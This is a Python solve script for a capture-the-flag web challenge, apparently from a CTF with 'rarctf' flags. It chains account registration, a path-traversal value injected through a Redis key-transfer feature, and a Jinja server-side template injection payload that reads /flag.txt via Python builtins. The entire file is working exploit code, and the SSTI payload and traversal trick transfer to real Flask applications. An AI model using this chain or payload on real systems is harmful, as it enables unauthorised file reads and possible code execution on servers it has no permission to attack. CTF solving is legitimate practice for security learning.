#!/usr/bin/python3

import requests
import uuid
import re
import sys

if len(sys.argv) < 2:
    print("Usage: solve.py http://host:port/")
    exit()

HOST = sys.argv[1]
uid1 = uuid.uuid4().hex
uid2 = uuid.uuid4().hex
s = requests.Session()
s2 = requests.Session()
s.post(HOST + "notes/register", data={"username": uid1})
s2.post(HOST + "notes/register", data={"username": uid2})

r = s.get(HOST + "notes/profile")
port1 = r.text.split("\n")[3].split(" ")[5][:-8]

r = s2.get(HOST + "notes/profile")
port2 = r.text.split("\n")[3].split(" ")[5][:-8]
s.post(HOST + "notes/profile", data={"mode": "adddata", "key": uid2, "value": f'../bio/{port1}'})
s.post(HOST + "notes/profile", data={"mode": "keytransfer", "host": "redis_users", "port": f"6379", "key": uid2})
# Overwrite the 'port' for user 2 to "../bio/<port1>"
# When `requests.post(f"http://redis_userdata:5000/putuser/{port}")` runs, the `../` will allow us to overwrite the 'bio' unfiltered
s2.post(HOST + "notes/profile", data={"mode": "adddata", "key":"bio", "value": '{{get_flashed_messages.__globals__.__builtins__.open("/flag.txt").read()}}'})

# s.post(HOST + "/notes/profile", data={"mode": "keytransfer", "host": "redis_userdata", "port": f"../bio/{port}", "key": "bio"})
r = s.get(HOST + "notes/profile")
print(re.findall(r'rarctf\{.*\}', r.text)[0])
